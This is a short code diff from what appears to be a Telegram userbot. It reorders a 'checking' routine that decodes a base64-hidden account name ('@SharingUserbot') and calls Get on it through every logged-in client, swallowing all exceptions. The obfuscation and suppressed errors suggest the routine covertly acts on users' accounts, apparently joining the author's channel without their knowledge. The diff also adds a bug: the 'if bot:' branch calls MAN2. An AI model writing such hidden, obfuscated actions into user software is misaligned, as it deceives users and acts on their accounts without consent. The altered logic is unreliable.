@@ -82,31 +82,51 @@ async def checking():
     checker = str(pybase64.b64decode("QFNoYXJpbmdVc2VyYm90"))[2:17]
     try:
         if bot:
-            await bot(Get(gocheck))
-            await bot(Get(checker))
+            await MAN2(Get(gocheck))
     except BaseException:
         pass
     try:
         if MAN2:
             await MAN2(Get(gocheck))
-            await MAN2(Get(checker))
     except BaseException:
         pass
     try:
         if MAN3:
             await MAN3(Get(gocheck))
-            await MAN3(Get(checker))
     except BaseException:
         pass
     try:
         if MAN4:
             await MAN4(Get(gocheck))
-            await MAN4(Get(checker))
     except BaseException:
         pass
     try:
         if MAN5:
             await MAN5(Get(gocheck))
+    except BaseException:
+        pass
+    try:
+        if bot:
+            await bot(Get(checker))
+    except BaseException:
+        pass
+    try:
+        if MAN2:
+            await MAN2(Get(checker))
+    except BaseException:
+        pass
+    try:
+        if MAN3:
+            await MAN3(Get(checker))
+    except BaseException:
+        pass
+    try:
+        if MAN4:
+            await MAN4(Get(checker))
+    except BaseException:
+        pass
+    try:
+        if MAN5:
             await MAN5(Get(checker))
     except BaseException:
         pass
